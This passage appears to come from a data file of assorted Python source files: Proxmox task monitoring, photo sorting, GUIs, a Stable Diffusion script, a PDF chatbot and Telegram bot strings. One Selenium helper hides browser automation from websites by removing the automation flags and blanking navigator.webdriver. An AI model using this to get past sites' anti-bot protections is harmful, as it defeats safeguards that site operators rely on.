task_status.get('exitstatus', None)\n        if status == \"stopped\":\n            if exitstatus not in [\"OK\"]:\n                tags = f\"warning,{node},{task['type']}\"\n            else:\n                tags = f\"white_check_mark,{node},{task['type']}\"\n            break\n        else:\n            current_time = time.time()\n            elapsed_time = current_time - start_time\n            if elapsed_time > timeout:\n                tags = f\"warning,{node},{task['type']}\"\n                exitstatus = \"TIMEOUT\"\n                logging.warning(f\"TIMEOUT [{uuid}] Timed out after {timeout} seconds.\")\n                break\n            else:\n                logging.debug(f\"RUNNING [{uuid}] Current status: {status}.\")\n                await asyncio.sleep(3)\n\n    log_entries = await get_task_log(proxmox, node, task_id)\n    title = uuid\n    message = f\"## Task Details\\n\\n\"\n    message += f\"**Status**: {exitstatus}\\n\"\n    message += f\"**User**: {task['user']}\\n\\n\"\n\n    message += \"### Task Status\\n\"\n    message += \"```json\\n\"\n    message += json.dumps(task_status, indent=2)\n    message += \"\\n```\\n\\n\"\n\n    message += \"### Task Log\\n\"\n    message += \"```json\\n\"\n    message += json.dumps(log_entries, indent=2)\n    message += \"\\n```\\n\"\n\n    await send_notification(title, tags, message)\n    logging.info(f\"Task {task_id} processed.\")\n    return task_id\n\n\nasync def fetch_tasks(proxmox):\n    logging.info(f'Fetching tasks...')\n    current_time = in",
    "import os\nimport time\n\nimport pandas as pd\n\nfrom pathlib import Path\n\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.service import Service\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.common.action_chains import ActionChains\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.support.ui import WebDriverWait\n\nimport undetected_chromedriver as uc\n\n\ndef create_undetected_driver(headless: bool):\n    driver = uc.Chrome(headless=headless)\n    return driver\n\n\ndef create_driver():\n    # Create ChromeOptions instance\n    ROOT_FOLDER = os.path.dirname(os.path.abspath(__file__))\n    CHROMEDRIVE_EXEC = Path(ROOT_FOLDER)/\"chromedriver.exe\"\n    print('path driver: ', CHROMEDRIVE_EXEC, \"#\"*30)\n    options = webdriver.ChromeOptions()\n\n    # Adding argument to disable the AutomationControlled flag\n    options.add_argument(\"--disable-blink-features=AutomationControlled\")\n\n    # Exclude the collection of enable-automation switches\n    options.add_experimental_option(\"excludeSwitches\", [\"enable-automation\"])\n\n    # Turn-off userAutomationExtension\n    options.add_experimental_option(\"useAutomationExtension\", False)\n\n    chrome_service = Service(executable_path=CHROMEDRIVE_EXEC)\n    # Setting the driver path and requesting a page\n    driver = webdriver.Chrome(service=chrome_service, options=options)\n\n    # Changing the property of the navigator value for webdriver to undefined\n    driver.execute_script(\n        \"Object.defineProperty(navigator, 'webdriver', {get: () => undefined})\")\n\n    return driver\n\n\ndef espera_elemento_presente(by, value, driver, TIME_TO_WAIT=10):\n\n    return WebDriverWait(driver, TIME_TO_WAIT).until(\n        EC.presence_of_element_located((by, value))\n    )\n\n\nif __name__ == '__main__':\n    driver = create_driver()\n    driver.get('https://www.google.com')\n    time.sleep(1)\n    espera_elemento_presente(By.ID, 'teste', driver)\n    print('teste')\n    driver.driver.quit()\n    print('teste')\n",
    "\"\"\"\r\n\u6b64\u811a\u672c\u7528\u4e8e\u5c06\u65e7\u7167\u7247\u751f\u6210pho\u8bfb\u53d6\u7684\u76ee\u5f55\u683c\u5f0f\r\n\"\"\"\r\nimport os\r\nfrom PIL import Image\r\nimport shutil\r\nfrom datetime import datetime\r\ndef process_photos(folder_path, target_folder):\r\n    # \u83b7\u53d6\u6587\u4ef6\u5939\u4e2d\u6240\u6709\u6587\u4ef6\u548c\u5b50\u6587\u4ef6\u5939\r\n    items = os.listdir(folder_path)\r\n    \r\n    # \u904d\u5386\u6bcf\u4e2a\u6587\u4ef6\u6216\u5b50\u6587\u4ef6\u5939\r\n    for item in items:\r\n        item_path = os.path.join(folder_path, item)\r\n        \r\n        # \u5982\u679c\u662f\u6587\u4ef6\u5939\uff0c\u5219\u9012\u5f52\u5904\u7406\u5b50\u6587\u4ef6\u5939\r\n        if os.path.isdir(item_path):\r\n            process_photos(item_path, target_folder)\r\n        else:\r\n            # \u4f7f\u7528Pillow\u5e93\u6253\u5f00\u56fe\u7247\u5e76\u83b7\u53d6\u62cd\u6444\u65e5\u671f\r\n            try:\r\n                with Image.open(item_path) as img:\r\n                    exif_data = img._getexif()\r\n                    # \u6839\u636eexif\u4e2d\u7684\u62cd\u6444\u65e5\u671f\u4fe1\u606f\u83b7\u53d6\u65e5\u671f\r\n                    if 36867 in exif_data:\r\n                        date_str = exif_data[36867].strip().replace(\" \", \"\")\r\n                        print(\"info:\",date_str)\r\n                        date_time = datetime.strptime(date_str, \"%Y:%m:%d%H:%M:%S\").date()\r\n                    else:\r\n                        date_time = datetime.fromtimestamp(os.path.getmtime(item_path)).date()\r\n            except (AttributeError, KeyError, IndexError, OSError,TypeError):\r\n                date_time = datetime.fromtimestamp(os.path.getmtime(item_path)).date()\r\n            \r\n            # \u521b\u5efa\u76ee\u6807\u6587\u4ef6\u5939\uff0c\u5982\u679c\u4e0d\u5b58\u5728\r\n            target_date_folder = os.path.join(target_folder, str(date_time.year), str(date_time.month).zfill(2), str(date_time.day).zfill(2))\r\n            if not os.path.exists(target_date_folder):\r\n                os.makedirs(target_date_folder)\r\n            \r\n            # \u79fb\u52a8\u6587\u4ef6\u5230\u76ee\u6807\u6587\u4ef6\u5939\r\n            shutil.move(item_path, os.path.join(target_date_folder, item))\r\n\r\n# \u5b9a\u4e49\u7167\u7247\u6587\u4ef6\u5939\u548c\u76ee\u6807\u6587\u4ef6\u5939\r\nphoto_folder = r\"D:\\\u5fae\u4e91\u7167\u7247\\\u6765\u81ea\u7167\u7247\u7ba1\u5bb6\"\r\ntarget_folder = r\"D:\\\u5fae\u4e91\u7167\u7247\"\r\n\r\n# \u5904\u7406\u7167\u7247\r\nprocess_photos(photo_folder, target_folder)\r\n\r\nprint(\"\u5206\u7c7b\u5b8c\u6210\uff01\")\r\n",
    "# -*- coding: utf-8 -*-\n\n################################################################################\n## Form generated from reading UI file 'mainwindow.ui'\n##\n## Created by: Qt User Interface Compiler version 6.6.3\n##\n## WARNING! All changes made in this file will be lost when recompiling UI file!\n################################################################################\n\nfrom PySide6.QtCore import (QCoreApplication, QDate, QDateTime, QLocale,\n    QMetaObject, QObject, QPoint, QRect,\n    QSize, QTime, QUrl, Qt)\nfrom PySide6.QtGui import (QBrush, QColor, QConicalGradient, QCursor,\n    QFont, QFontDatabase, QGradient, QIcon,\n    QImage, QKeySequence, QLinearGradient, QPainter,\n    QPalette, QPixmap, QRadialGradient, QTransform)\nfrom PySide6.QtWidgets import (QApplication, QLabel, QMainWindow, QPushButton,\n    QSizePolicy, QWidget)\n\nclass Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        if not MainWindow.objectName():\n            MainWindow.setObjectName(u\"MainWindow\")\n        MainWindow.resize(800, 644)\n        self.centralwidget = QWidget(MainWindow)\n        self.centralwidget.setObjectName(u\"centralwidget\")\n        self.tests = QLabel(self.centralwidget)\n        self.tests.setObjectName(u\"tests\")\n        self.tests.setGeometry(QRect(340, 10, 96, 41))\n        self.tests.setMouseTracking(True)\n        self.tests.setStyleSheet(u\"font: 28pt \\\"Times New Roman\\\";\")\n        self.student = QPushButton(self.centralwidget)\n        self.student.setObjectName(u\"student\")\n        self.student.setGeometry(QRect(240, 240, 301, 91))\n        self.teacher = QPushButton(self.centralwidget)\n        self.teacher.setObjectName(u\"teacher\")\n        self.teacher.setGeometry(QRect(240, 330, 301, 91))\n        MainWindow.setCentralWidget(self.centralwidget)\n\n        self.retranslateUi(MainWindow)\n\n        QMetaObject.connectSlotsByName(MainWindow)\n    # setupUi\n\n    def retranslateUi(self, MainWindow):\n        MainWindow.setWindowTitle(QCoreApplication.translate(\"MainWindow\", u\"MainWindow\", None))\n        self.tests.setText(QCoreApplication.translate(\"MainWindow\", u\"\\u0422\\u0435\\u0441\\u0442\\u044b\", None))\n        self.student.setText(QCoreApplication.translate(\"MainWindow\", u\"\\u0423\\u0447\\u0435\\u043d\\u0438\\u043a\", None))\n        self.teacher.setText(QCoreApplication.translate(\"MainWindow\", u\"\\u0423\\u0447\\u0438\\u0442\\u0435\\u043b\\u044c\", None))\n    # retranslateUi\n\n",
    "import random\n\nimport gradio as gr\nimport numpy as np\nimport modules.scripts as scripts\nfrom modules import devices, processing\n\nfrom PIL import Image\n\n\nclass Script(scripts.Script):\n\n    def __init__(self):\n        self.scalingW = 0\n        self.scalingH = 0\n        self.hr_denoise = 0\n        self.hr_steps = 0\n        self.scaler = \"\"\n\n    def title(self):\n        return \"Fast Alternate Init Noise\"\n\n    def show(self, is_img2img):\n        if not is_img2img:\n            return scripts.AlwaysVisible\n        return False\n\n    def ui(self, is_img2img):\n\n        with gr.Accordion(\"Noise Color Picker\", open=False):\n            enabled = gr.Checkbox(label=\"Enabled\", default=False)\n\n            denoising = gr.Slider(\n                minimum=0.0,\n                maximum=1.0,\n                step=0.01,\n                label=\"Denoising strength\",\n                value=0.9,\n                elem_id=self.elem_id(\"denoising\"),\n            )\n\n            with gr.Accordion(\"Color Adjustments\", open=False):\n                with gr.Row():\n                    val_min = gr.Slider(\n                        minimum=-1,\n                        maximum=255,\n                        step=1,\n                        value=-1,\n                        label=\"Brightness Min\",\n                        elem_id=self.elem_id(\"plasma_val_min\"),\n                    )\n                    val_max = gr.Slider(\n                        minimum=-1,\n                        maximum=255,\n                        step=1,\n                        value=-1,\n                        label=\"Brightness Max\",\n                        elem_id=self.elem_id(\"plasma_val_max\"),\n                    )\n                with gr.Row():\n                    red_min = gr.Slider(\n                        minimum=-1,\n                        maximum=255,\n                        step=1,\n                        value=-1,\n                        label=\"Red Min\",\n                        elem_id=self.elem_id(\"plasma_red_min\"),\n                    )\n                    red_max = gr.Slider(\n                        minimum=-1,\n                        maximum=255,\n                        step=1,\n                        value=-1,\n                        label=\"Red Max\",\n                        elem_id=self.elem_id(\"plasma_red_max\"),\n                    )\n                with gr.Row():\n                    grn_min = gr.Slider(\n                        minimum=-1,\n                        maximum=255,\n                        step=1,\n                        value=-1,\n                        label=\"Green Min\",\n                        elem_id=self.elem_id(\"plasma_grn_min\"),\n                    )\n                    grn_max = gr.Slider(\n                        minimum=-1,\n                        maximum=255,\n                        step=1,\n                        value=-1,\n                        label=\"Green Max\",\n                        elem_id=self.elem_id(\"plasma_grn_max\"),\n                    )\n                with gr.Row():\n                    blu_min = gr.Slider(\n                        minimum=-1,\n                        maximum=255,\n                        step=1,\n                        value=-1,\n                        label=\"Blue Min\",\n                        elem_id=self.elem_id(\"plasma_blu_min\"),\n                    )\n                    blu_max = gr.Slider(\n                        minimum=-1,\n                        maximum=255,\n                        step=1,\n                        value=-1,\n                        label=\"Blue Max\",\n                        elem_id=self.elem_id(\"plasma_blu_max\"),\n                    )\n\n            with gr.Row():\n                seed_choice = gr.Textbox(\n                    label=\"Seed override\",\n                    value=-1,\n                    interactive=True,\n                    elem_id=self.elem_id(\"seed_choice\"),\n                    visible=False,\n                )\n\n        return [\n            enabled,\n            denoising,\n            val_min,\n            val_max,\n            red_min,\n            red_max,\n            grn_min,\n            grn_max,\n            blu_min,\n            blu_max,\n            seed_choice,\n        ]\n\n    def create_fast_noise(\n        self,\n        p,\n        enabled,\n        denoising,\n        val_min,\n        val_max,\n        red_min,\n        red_max,\n        grn_min,\n        grn_max,\n        blu_min,\n        blu_max,\n        seed_choice,\n    ):\n\n        np.random.seed(seed_choice)\n        random.seed(seed_choice)\n        orig_width = p.width\n        orig_height = p.height\n\n        width = (p.width // 4) + 4\n        height = (p.height // 4) + 4\n\n        if red_min == -1:\n            red_min = 0\n        if red_max == -1:\n            red_max = 255\n        if grn_min == -1:\n            grn_min = 0\n        if grn_max == -1:\n            grn_max = 255\n        if blu_min == -1:\n            blu_min = 0\n        if blu_max == -1:\n            blu_max = 255\n        if val_min == -1:\n            val_min = 0\n        if val_max == -1",
    "COLORS = ['red','green','yellow','blue','magenta','cyan','light_cyan',\n'light_magenta','light_blue','light_yellow','light_green','light_red']\n\nFONTS = ['3-d', '3x5', '5lineoblique', 'acrobatic', 'alligator', 'alligator2', 'alphabet',\n'avatar', 'banner', 'banner3-D', 'banner3', 'banner4', 'barbwire', 'basic', 'bell', 'big',\n'bigchief', 'binary', 'block', 'bubble', 'bulbhead', 'calgphy2', 'caligraphy', 'catwalk',\n'chunky', 'coinstak', 'colossal', 'computer', 'contessa', 'contrast', 'cosmic', 'cosmike',\n'cricket', 'cyberlarge', 'cybermedium', 'cybersmall', 'diamond', 'digital', 'doh', 'doom', \n'dotmatrix', 'drpepper', 'eftichess', 'eftifont', 'eftipiti', 'eftirobot', 'eftitalic',\n'eftiwall', 'eftiwater', 'epic', 'fender', 'fourtops', 'fuzzy', 'goofy', 'gothic', 'graffiti', \n'hollywood', 'invita', 'isometric1', 'isometric2', 'isometric3', 'isometric4', 'italic',\n'ivrit', 'jazmine', 'jerusalem', 'katakana', 'kban', 'larry3d', 'lcd', 'lean', 'letters',\n'linux', 'lockergnome', 'madrid', 'marquee', 'maxfour', 'mike', 'mini', 'mirror', 'mnemonic',\n'morse', 'moscow', 'nancyj-fancy', 'nancyj-underlined', 'nancyj', 'nipples', 'ntgreek', 'o8', \n'ogre', 'pawp', 'peaks', 'pebbles', 'pepper', 'poison', 'puffy', 'pyramid', 'rectangles', \n'relief', 'relief2', 'rev', 'roman', 'rot13', 'rounded', 'rowancap', 'rozzo', 'runic', \n'runyc', 'sblood', 'script', 'serifcap', 'shadow', 'short', 'slant', 'slide', 'slscript', \n'small', 'smisome1', 'smkeyboard', 'smscript', 'smshadow', 'smslant', 'smtengwar', 'speed',\n'stampatello', 'standard', 'starwars', 'stellar', 'stop', 'straight', 'tanja', 'tengwar', \n'term', 'thick', 'thin', 'threepoint', 'ticks', 'ticksslant', 'tinker-toy', 'tombstone', \n'trek', 'tsalagi', 'twopoint', 'univers', 'usaflag', 'weird']\n",
    "import wikipedia # type: ignore\r\nimport tkinter as tk\r\nfrom tkinter import scrolledtext as st\r\nimport os\r\nimport subprocess\r\nlanguages = {\r\n    'EN':'en',\r\n    'RU':'ru',\r\n    'DE':'de',\r\n    'FR':'fr',\r\n    'ES':'es',\r\n    'ZH':'zh',\r\n    'JA':'ja',\r\n    'KO':'ko'\r\n}\r\nlang = 'EN'\r\ndef open_search_file():\r\n    if os.path.isfile(\"previous_search.txt\"):\r\n        subprocess.run(['notepad.exe', 'previous_search.txt'])\r\n    else:\r\n        text_area.delete(\"1.0\", tk.END)\r\n        text_area.insert(tk.END, \"previous_search.txt not found.\")\r\ndef switch_language(new_lang):\r\n    global lang\r\n    lang = new_lang\r\n    wikipedia.set_lang(languages[lang.upper()])\r\ndef search_wikipedia():\r\n    query = entry.get()\r\n    try:\r\n        current_content = text_area.get(\"1.0\", tk.END)\r\n        if current_content.strip():\r\n            with open(\"previous_search.txt\", \"w\", encoding=\"utf-8\") as file:\r\n                file.write(current_content)\r\n        wikipedia.set_lang(languages[lang.upper()])  # \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u043e upper()\r\n        result = wikipedia.page(query)\r\n        text_area.delete(1.0, tk.END)\r\n        text_area.insert(tk.END, result.content)\r\n    except wikipedia.exceptions.DisambiguationError as e:\r\n        options = \", \".join(e.options)\r\n        text_area.delete(1.0, tk.END)\r\n        text_area.insert(tk.END, f\"Please specify your question, there are some options: {options}\")\r\n    except wikipedia.exceptions.PageError:\r\n        text_area.delete(1.0, tk.END)\r\n        text_area.insert(tk.END, \"Nothing was found on Wikipedia.\")\r\ndef on_closing():\r\n    current_content = text_area.get(\"1.0\", tk.END)\r\n    if current_content.strip():\r\n        with open(\"previous_search.txt\", \"w\", encoding=\"utf-8\") as file:\r\n            file.write(current_content)\r\n    root.destroy()\r\nroot = tk.Tk()\r\nroot.title(\"WIKIPEDIA(made by xeon)\")\r\nroot.geometry(\"1024x768\")\r\nroot.configure(bg=\"#d1d1d1\")\r\nroot.bind('<Control-Alt_L>', switch_language)\r\nroot.bind('<Control-Alt_R>', switch_language)\r\nlabel = tk.Label(root, text=\"Enter request:\\n(All your previous searchs saves in previous_search.txt)\\nAlso you can swap language by CTRL+2xALT\", bg=(\"#d1d1d1\") , font=('Ink Free', 24))\r\nlabel.pack(padx=10,pady=10)\r\ncontrol_frame = tk.Frame(root, bg=\"#d1d1d1\")\r\ncontrol_frame.pack(padx=10, pady=5)\r\nentry = tk.Entry(control_frame, width=50 , bg=\"#bfbfbf\", fg=\"#000000\", bd=0 , font=('Segoe Script', 12))\r\nentry.grid(row=1, column=1,padx = 5)\r\nentry.bind(\"<Return>\", lambda event: search_wikipedia())\r\nlanguage_var = tk.StringVar(value=lang,)\r\nlanguage_menu = tk.OptionMenu(control_frame, language_var, *languages.keys(), command=switch_language)\r\nlanguage_menu.config(bg=\"#e0e0e0\", fg=\"#000000\",bd=0,highlightthickness=0)\r\nlanguage_menu.grid(row=1, column=12, padx=5)\r\nsearch_button = tk.Button(control_frame, text=\"\ud83d\udd0e\", height=1 ,width= 2,command=search_wikipedia, bg=\"#e0e0e0\", fg=\"#000000\", bd=0)\r\nsearch_button.grid(row=1, column=2,padx = 5)\r\nopen_file_button = tk.Button(control_frame, text=\"Open file with previous searches\", command=open_search_file, bg=\"#e0e0e0\", fg=\"#000000\", bd=0,)\r\nopen_file_button.grid(row=1, column=4 , padx = 5)\r\ntext_area = st.ScrolledText(root, width=10000, height=5000, bg=\"#b3b3b3\", fg=\"Black\", bd=0, font=('Segoe Script', 12))\r\ntext_area.pack(padx=10, pady=5)\r\nroot.protocol(\"WM_DELETE_WINDOW\", on_closing)\r\nroot.mainloop()\r\n",
    "from dotenv import load_dotenv\nimport streamlit as st\nfrom PyPDF2 import PdfReader\nfrom langchain.text_splitter import CharacterTextSplitter\nfrom langchain.embeddings.openai import OpenAIEmbeddings\nfrom langchain.vectorstores import FAISS\nfrom langchain.chains.question_answering import load_qa_chain\nfrom langchain.llms import OpenAI\nfrom langchain.callbacks import get_openai_callback\nfrom streamlit_extras.add_vertical_space import add_vertical_space\n\n\ndef main():\n    load_dotenv()\n    st.set_page_config(page_title=\"Ask your PDF\")\n    st.header(\"Ask your PDF \ud83d\udcac\")\n    # Sidebar contents\n    with st.sidebar:\n        st.title('\ud83e\udd17\ud83d\udcac LLM Chat App')\n        st.markdown('''\n        ## About\n        This app is an LLM-powered chatbot built using:\n        - [Streamlit](https://streamlit.io/)\n        - [LangChain](https://python.langchain.com/)\n        - [OpenAI](https://platform.openai.com/docs/models) LLM model\n\n        ''')\n        add_vertical_space(5)\n        st.write('Made with \u2764\ufe0f by [Mehdox-B](https://github.com/Mehdox-B)')\n\n    # upload file\n    pdf = st.file_uploader(\"Upload your PDF\", type=\"pdf\")\n\n    # extract the text\n    if pdf is not None:\n        pdf_reader = PdfReader(pdf)\n        text = \"\"\n        for page in pdf_reader.pages:\n            text += page.extract_text()\n\n        # split into chunks\n        text_splitter = CharacterTextSplitter(\n            separator=\"\\n\",\n            chunk_size=1000,\n            chunk_overlap=200,\n            length_function=len\n        )\n        chunks = text_splitter.split_text(text)\n\n        # create embeddings\n        embeddings = OpenAIEmbeddings()\n        knowledge_base = FAISS.from_texts(chunks, embeddings)\n\n        # show user input\n        user_question = st.text_input(\"Ask a question about your PDF:\")\n        if user_question:\n            docs = knowledge_base.similarity_search(user_question)\n\n            llm = OpenAI()\n            chain = load_qa_chain(llm, chain_type=\"stuff\")\n            with get_openai_callback() as cb:\n                response = chain.run(input_documents=docs, question=user_question)\n                print(cb)\n\n            st.write(response)\n\n\nif __name__ == '__main__':\n    main()\n",
    "#MAVIMODS\n\nfrom pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton\n\nclass Translation(object):\n\n    START_TEXT = \"\"\"\n\ud83d\udc4b H\u1d07\u028f {} \n\n\u2d4a A\u1d0d T\u1d07\u029f\u1d07\u0262\u0280\u1d00\u1d0d URL U\u1d18\u029f\u1d0f\u1d00\u1d05\u1d07\u0280 B\u1d0f\u1d1b.\n\n**S\u1d07\u0274\u1d05 \u1d0d\u1d07 \u1d00 \u1d05\u026a\u0280\u1d07\u1d04\u1d1b \u029f\u026a\u0274\u1d0b \u1d00\u0274\u1d05 \u026a \u1d21\u026a\u029f\u029f \u1d1c\u1d18\u029f\u1d0f\u1d00\u1d05 \u026a\u1d1b \u1d1b\u1d0f \u1d1b\u1d07\u029f\u1d07\u0262\u0280\u1d00\u1d0d \u1d00s \u1d00 \ua730\u026a\u029f\u1d07/\u1d20\u026a\u1d05\u1d07\u1d0f**\n\nUs\u1d07 \u029c\u1d07\u029f\u1d18 \u0299\u1d1c\u1d1b\u1d1b\u1d0f\u0274 \u1d1b\u1d0f \u1d0b\u0274\u1d0f\u1d21 \u029c\u1d0f\u1d21 \u1d1b\u1d0f \u1d1cs\u1d07 \u1d0d\u1d07\n\n\"\"\"\n    HELP_TEXT = \"\"\"\n\u029f\u026a\u0274\u1d0b \u1d1b\u1d0f \u1d0d\u1d07\u1d05\u026a\u1d00 \u1d0f\u0280 \ua730\u026a\u029f\u1d07\n\n\u27a0 s\u1d07\u0274\u1d05 \u1d00 \u029f\u026a\u0274\u1d0b \ua730\u1d0f\u0280 \u1d1c\u1d18\u029f\u1d0f\u1d00\u1d05 \u1d1b\u1d0f \u1d1b\u1d07\u029f\u1d07\u0262\u0280\u1d00\u1d0d \ua730\u026a\u029f\u1d07 \u1d0f\u0280 \u1d0d\u1d07\u1d05\u026a\u1d00.\n\ns\u1d07\u1d1b \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f\n\n\u27a0 s\u1d07\u0274\u1d05 \u1d00 \u1d18\u029c\u1d0f\u1d1b\u1d0f \u1d1b\u1d0f \u1d0d\u1d00\u1d0b\u1d07 \u026a\u1d1b \u1d00s \u1d18\u1d07\u0280\u1d0d\u1d00\u0274\u1d07\u0274\u1d1b \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f.\n\n\u1d05\u1d07\u029f\u1d07\u1d1b\u026a\u0274\u0262 \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f\n\n\u27a0 s\u1d07\u0274\u1d05 /delthumb \u1d1b\u1d0f \u1d05\u1d07\u029f\u1d07\u1d1b\u1d07 \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f.\n\ns\u1d07\u1d1b\u1d1b\u026a\u0274\u0262s\n\n\u27a0 \u1d04\u1d0f\u0274\u0493\u026a\u0262\u1d1c\u0280\u1d07 \u1d0d\u028f s\u1d07\u1d1b\u1d1b\u026a\u0274\u0262s \u1d1b\u1d0f \u1d04\u029c\u1d00\u0274\u0262\u1d07 \u1d1c\u1d18\u029f\u1d0f\u1d00\u1d05 \u1d0d\u1d0f\u1d05\u1d07\n\ns\u029c\u1d0f\u1d21 \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f\n\n\u27a0 s\u1d07\u0274\u1d05 /showthumb \u1d1b\u1d0f \u1d20\u026a\u1d07\u1d21 \u1d04\u1d1cs\u1d1b\u1d0f\u1d0d \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f.\n \n\"\"\"\n    ABOUT_TEXT = \"\"\"\n**M\u028f \u0274\u1d00\u1d0d\u1d07** : [\u1d1c\u1d18\u029f\u1d0f\u1d00\u1d05\u1d07\u0280 \u0299\u1d0f\u1d1b](https://t.me/MaviupBot)\n\n**C\u029c\u1d00\u0274\u0274\u1d07\u029f** : [\u1d0d\u1d00\u1d20\u026a \u1d0d\u1d0f\u1d05\ua731](https://t.me/MODSMAVI)\n\n**S\u1d1c\u1d18\u1d18\u1d0f\u0280\u1d1b G\u0280\u1d0f\u1d1c\u1d18** : [\u1d0d\u1d00\u1d20\u026a \ua731\u1d1c\u1d18\u1d18\u1d0f\u0280\u1d1b \u0262\u0280\u1d0f\u1d1c\u1d18](https://t.me/mavibot_support)\n\n**D\u1d07\u1d20\u1d07\u029f\u1d0f\u1d18\u1d07\u0280 :** @MODSMAVI\n\"\"\"\n\n\n    PROGRESS = \"\"\"\n\ud83c\udfce\ufe0f S\u1d18\u1d07\u1d07\u1d05 : {3}/s\\n\\n\n\u2705 D\u1d0f\u0274\u1d07 : {1}\\n\\n\n\ud83d\udff0 T\u1d0f\u1d1b\u1d00\u029f s\u026a\u1d22\u1d07  : {2}\\n\\n\n\u23f3 T\u026a\u1d0d\u1d07 \u029f\u1d07\u0493\u1d1b : {4}\\n\\n\n\"\"\"\n\n\n    START_BUTTONS = InlineKeyboardMarkup(\n        [[\n        InlineKeyboardButton('\u2699\ufe0f s\u1d07\u1d1b\u1d1b\u026a\u0274\u0262s', callback_data='OpenSettings')\n        ],[\n        InlineKeyboardButton('\u2754 \u029c\u1d07\u029f\u1d18', callback_data='help'),\n        InlineKeyboardButton('\ud83d\udc68\u200d\ud83d\ude92 \u1d00\u0299\u1d0f\u1d1c\u1d1b', callback_data='about')\n        ],[\n        InlineKeyboardButton('\u26d4\ufe0f \u1d04\u029f\u1d0fs\u1d07', callback_data='close')\n        ]]\n    )\n    HELP_BUTTONS = InlineKeyboardMarkup(\n        [[\n        InlineKeyboardButton('\ud83c\udfe1 \u029c\u1d0f\u1d0d\u1d07', callback_data='home'),\n        InlineKeyboardButton('\ud83d\udc68\u200d\ud83d\ude92 \u1d00\u0299\u1d0f\u1d1c\u1d1b', callback_data='about')\n        ],[\n        InlineKeyboardButton('\u26d4\ufe0f \u1d04\u029f\u1d0fs\u1d07', callback_data='close')\n        ]]\n    )\n    ABOUT_BUTTONS = InlineKeyboardMarkup(\n        [[\n        InlineKeyboardButton('\ud83c\udfe1 \u029c\u1d0f\u1d0d\u1d07', callback_data='home'),\n        InlineKeyboardButton('\u2754 \u029c\u1d07\u029f\u1d18', callback_data='help')\n        ],[\n        InlineKeyboardButton('\u26d4\ufe0f \u1d04\u029f\u1d0fs\u1d07', callback_data='close')\n        ]]\n    )\n    BUTTONS = InlineKeyboardMarkup(\n        [[\n        InlineKeyboardButton('\u26d4\ufe0f \u1d04\u029f\u1d0fs\u1d07', callback_data='close')\n        ]]\n    )\n    TEXT = \"s\u1d07\u0274\u1d05 \u1d0d\u1d07 \u1d00\u0274\u028f \u1d04\u1d1cs\u1d1b\u1d0f\u1d0d \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f \u1d1b\u1d0f s\u1d07\u1d1b \u026a\u1d1b\"\n    IFLONG_FILE_NAME = \" Only 64 characters can be named . \"\n    RENAME_403_ERR = \"Sorry. You are not permitted to rename this file.\"\n    ABS_TEXT = \" Please don't be selfish.\"\n    FORMAT_SELECTION = \"N\u1d0f\u1d21 S\u1d07\u029f\u1d07\u1d04\u1d1b T\u029c\u1d07 D\u1d07s\u026a\u0280\u1d07\u1d05 F\u1d0f\u0280\u1d0d\u1d00\u1d1b \u1d0f\u0280 F\u026a\u029f\u1d07 \ud83d\uddc4\ufe0f S\u026a\u1d22\u1d07 \u1d1b\u1d0f U\u1d18\u029f\u1d0f\u1d00\u1d05\"\n    SET_CUSTOM_USERNAME_PASSWORD = \"\"\"\"\"\"\n    NOYES_URL = \"@robot URL detected. Please use https://shrtz.me/PtsVnf6 and get me a fast URL so that I can upload to Telegram, without me slowing down for other users.\"\n    DOWNLOAD_START = \"D\u1d0f\u1d21\u0274\u029f\u1d0f\u1d00\u1d05\u026a\u0274\u0262 \u1d1b\u1d0f \u1d0d\u028f s\u1d07\u0280\u1d20\u1d07\u0280 \u1d18\u029f\u1d07\u1d00s\u1d07 \u1d21\u1d00\u026a\u1d1b  \u23f3\"\n    UPLOAD_START = \"\ud83d\udce4 U\u1d18\u029f\u1d0f\u1d00\u1d05\u026a\u0274\u0262 P\u029f\u1d07\u1d00s\u1d07 W\u1d00\u026a\u1d1b\"\n    RCHD_BOT_API_LIMIT = \"size greater than maximum allowed size (50MB). Neverthless, trying to upload.\"\n    RCHD_TG_API_LIMIT = \"Downloaded in {} seconds.\\nDetected File Size: {}\\nSorry. But, I cannot upload files greater than 2GB due to Telegram API limitations.\"\n    #AFTER_SUCCESSFUL_UPLOAD_MSG = \" OWNER : Lisa \ud83d\udc95\\nFor the List of Telegram Bots\"\n    AFTER_SUCCESSFUL_UPLOAD_MSG_WITH_TS = \"D\u1d0f\u1d21\u0274\u029f\u1d0f\u1d00\u1d05\u1d07\u1d05 \u026a\u0274 {} s\u1d07\u1d04\u1d0f\u0274\u1d05s.\\n\\nT\u029c\u1d00\u0274\u1d0bs F\u1d0f\u0280 Us\u026a\u0274\u0262 M\u1d07\\n\\nU\u1d18\u029f\u1d0f\u1d00\u1d05\u1d07\u1d05 \u026a\u0274 {} s\u1d07\u1d04\u1d0f\u0274\u1d05s\"\n    NOT_AUTH_USER_TEXT_FILE_SIZE = \"Detected File Size: {}. Free Users can only upload: {}\\nPlease /upgrade your subscription.\\nIf you think this is a bug, please contact <a href='https://t.me/mavibot_support'>@MODSMAVI</a>\"\n    SAVED_CUSTOM_THUMB_NAIL = \"C\u1d1cs\u1d1b\u1d0f\u1d0d \u1d20\u026a\u1d05\u1d07\u1d0f / \u0493\u026a\u029f\u1d07 \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f s\u1d00\u1d20\u1d07\u1d05. T\u029c\u026as \u026a\u1d0d\u1d00\u0262\u1d07 \u1d21\u026a\u029f\u029f \u0299\u1d07 \u1d1cs\u1d07\u1d05 \u026a\u0274 \u1d1b\u029c\u1d07 \u1d20\u026a\u1d05\u1d07\u1d0f / \u0493\u026a\u029f\u1d07.\"\n    